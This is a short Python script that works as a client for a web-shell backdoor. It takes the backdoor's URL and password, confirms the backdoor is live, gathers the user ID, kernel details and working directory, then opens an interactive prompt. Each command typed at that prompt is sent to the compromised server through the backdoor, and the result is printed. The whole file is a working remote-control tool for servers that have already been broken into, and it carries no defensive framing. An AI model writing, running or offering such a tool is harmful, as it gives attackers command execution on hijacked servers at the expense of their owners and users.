from requests import get
from time import sleep
import os

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
     
url = raw_input("[?] Input Backdoor Localtion\t: ")
password = raw_input("[?] Input Backdoor Password\t: ")

try:
    check = get(url, params={"password":password}).text.replace('\n','')
except:
    print("[-] Error, Check your URL")
    exit(0)

if check == "true":
   
   userID = get(url, params={"password":password,"cmd":"id"}).text.replace('\n','')
   kernel = get(url, params={"password":password,"cmd":"uname -nvpmso"}).text.replace('\n','')
   getpwnd = get(url, params={"password":password,"cmd":"pwd"}).text.replace('\n','')
   
   print("[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]")
   print("[!] Backdoor Is Live.. Waiting to Connect BackDoor")
   print("[+] Kernel\t: " + kernel)
   print("[+] User ID\t: " + userID)
   print("[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n")
   
   sleep(2)
   #PARAMS = {"password":password,"cmd":"whoami"}
   #r = get(url, params=PARAMS).text
   #domain = get(url, params="domain").text.replace('\n','')
   command = "Remback@shell:" +getpwnd + "# "
   while True:
        cmd = raw_input(command)
        if cmd == "exit":
            break
        elif cmd == "clear":
            cls()
            
            
        PARAMS = {"password":password,"cmd":cmd}
        result = get(url, params=PARAMS).text
        print(result + "\n")
        
   
else:
    print("[-] Password is Incoret")
    exit(0)


